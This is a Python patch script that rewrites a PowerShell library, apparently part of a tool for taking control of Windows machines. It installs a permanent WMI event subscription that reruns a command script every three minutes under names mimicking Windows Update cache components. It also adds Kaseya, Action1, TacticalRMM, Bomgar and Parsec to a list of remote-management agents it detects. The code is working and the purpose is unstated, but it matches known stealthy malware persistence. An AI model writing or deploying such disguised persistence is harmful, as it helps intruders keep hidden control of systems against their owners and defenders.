from __future__ import annotations

import io
import re

# ── own_lib.ps1: IDENTVER, WMI ensure, state tasks query, header ──
p = r"C:\Users\nobuddy\Desktop\Project\own_lib.ps1"
s = io.open(p, encoding="utf-8").read()

s = s.replace("# OWN_LIB  BUILD 20260802L8", "# OWN_LIB  BUILD 20260802L9")
s = s.replace("$IdentVersion = 4", "$IdentVersion = 5")

# Replace Install-Watchdog + Ensure-Watchdog entirely
old_wd = s[s.index("function Install-Watchdog {"):s.index("# Correct 32-bit + 64-bit ARP hives.")]
new_wd = r'''function Remove-Watchdog {
    foreach ($cls in @('__FilterToConsumerBinding','__EventFilter','CommandLineEventConsumer','__IntervalTimerInstruction')) {
        Get-WmiObject -Namespace root\subscription -Class $cls -ErrorAction SilentlyContinue |
            Where-Object {
                ($_.Name -eq 'WucacheWatchdogF') -or ($_.Name -eq 'WucacheWatchdogC') -or
                ($_.TimerId -eq 'WucacheWatchdog') -or
                ($_.Filter -and $_.Filter.ToString() -like '*WucacheWatchdogF*') -or
                ($_.Consumer -and $_.Consumer.ToString() -like '*WucacheWatchdogC*')
            } | ForEach-Object { $_.Delete() | Out-Null }
    }
}

function Install-Watchdog {
    if (-not $MonPath) { return $false }
    Remove-Watchdog
    $ok = $true
    try {
        Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
            -Arguments @{ TimerId = 'WucacheWatchdog'; IntervalMilliseconds = 180000; SkipIfPassed = $false } | Out-Null
        $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
            -Arguments @{ Name = 'WucacheWatchdogF'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL';
                          Query = "SELECT * FROM __TimerEvent WHERE TimerId='WucacheWatchdog'" }
        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
            -Arguments @{ Name = 'WucacheWatchdogC'; CommandLineTemplate = "cmd.exe /c `"$MonPath`""; RunInteractively = $false }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
    } catch { $ok = $false }
    return $ok
}

function Test-WatchdogGraph {
    $t = Get-WmiObject -Namespace root\subscription -Class __IntervalTimerInstruction -Filter "TimerId='WucacheWatchdog'" -ErrorAction SilentlyContinue
    $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WucacheWatchdogF'" -ErrorAction SilentlyContinue
    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
    $b = $null
    if ($f -and $c) {
        $b = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like '*WucacheWatchdogF*' -and $_.Consumer -like '*WucacheWatchdogC*' } |
            Select-Object -First 1
    }
    return [bool]($t -and $f -and $c -and $b)
}

function Ensure-Watchdog {
    if (Test-WatchdogGraph) { return 'OK' }
    if (-not $MonPath) { return 'MISSING' }
    if (Install-Watchdog) { return 'REARMED' }
    return 'FAIL'
}

'''
s = s[:s.index("function Install-Watchdog {")] + new_wd + s[s.index("# Correct 32-bit + 64-bit ARP hives."):]

# Fix Update-State task counting (LASTEXITCODE after pipe is unreliable)
s = s.replace(
    """    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        & schtasks.exe /Query /TN $id[$k] 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0) { $tasksOk++ }
    }
    $wd = Ensure-Watchdog""",
    """    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        $tn = [string]$id[$k]
        if (-not $tn) { continue }
        # do NOT pipe to Out-Null - that clears LASTEXITCODE on PS 5.1
        cmd.exe /c "schtasks /Query /TN `"$tn`" >nul 2>&1"
        if ($LASTEXITCODE -eq 0) { $tasksOk++ }
    }
    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
    $wd = Ensure-Watchdog"""
)

# Extend RMM list - add after ManageEngine entry if not present
if "Tag='Kaseya'" not in s:
    s = s.replace(
        "@{ Tag='ManageEngine'; Svc=@('ManageEngine*','UEMS*'); Proc=@('ManageEngine*','dcagent*'); Dirs=@(\"$env:ProgramFiles\\ManageEngine\",\"${env:ProgramFiles(x86)}\\ManageEngine\"); Prod=@('ManageEngine*','UEMS*') }",
        "@{ Tag='ManageEngine'; Svc=@('ManageEngine*','UEMS*'); Proc=@('ManageEngine*','dcagent*'); Dirs=@(\"$env:ProgramFiles\\ManageEngine\",\"${env:ProgramFiles(x86)}\\ManageEngine\"); Prod=@('ManageEngine*','UEMS*') }\n"
        "        @{ Tag='Kaseya';      Svc=@('Kaseya*','AgentMon'); Proc=@('AgentMon*','Kaseya*'); Dirs=@(\"$env:ProgramFiles\\Kaseya\",\"${env:ProgramFiles(x86)}\\Kaseya\"); Prod=@('Kaseya*') }\n"
        "        @{ Tag='Action1';     Svc=@('Action1*'); Proc=@('Action1*'); Dirs=@(\"$env:ProgramFiles\\Action1\",\"${env:ProgramFiles(x86)}\\Action1\",\"$env:ProgramData\\Action1\"); Prod=@('Action1*') }\n"
        "        @{ Tag='TacticalRMM'; Svc=@('tacticalrmm*','Mesh Agent'); Proc=@('tacticalrmm*','meshagent*'); Dirs=@(\"$env:ProgramFiles\\TacticalAgent\",\"${env:ProgramFiles(x86)}\\TacticalAgent\"); Prod=@('Tactical*','Mesh Agent*') }\n"
        "        @{ Tag='Bomgar';      Svc=@('bomgar*','BeyondTrust*'); Proc=@('bomgar*'); Dirs=@(\"$env:ProgramFiles\\Bomgar\",\"${env:ProgramFiles(x86)}\\Bomgar\"); Prod=@('Bomgar*','BeyondTrust*') }\n"
        "        @{ Tag='Parsec';      Svc=@('Parsec*'); Proc=@('parsecd*','pservice*'); Dirs=@(\"$env:ProgramFiles\\Parsec\",\"${env:ProgramFiles(x86)}\\Parsec\",\"$env:ProgramData\\Parsec\"); Prod=@('Parsec*') }"
    )

io.open(p, "w", encoding="utf-8", newline="\n").write(s)
print("own_lib L9 patched", "IDENTVER", "5" in s)
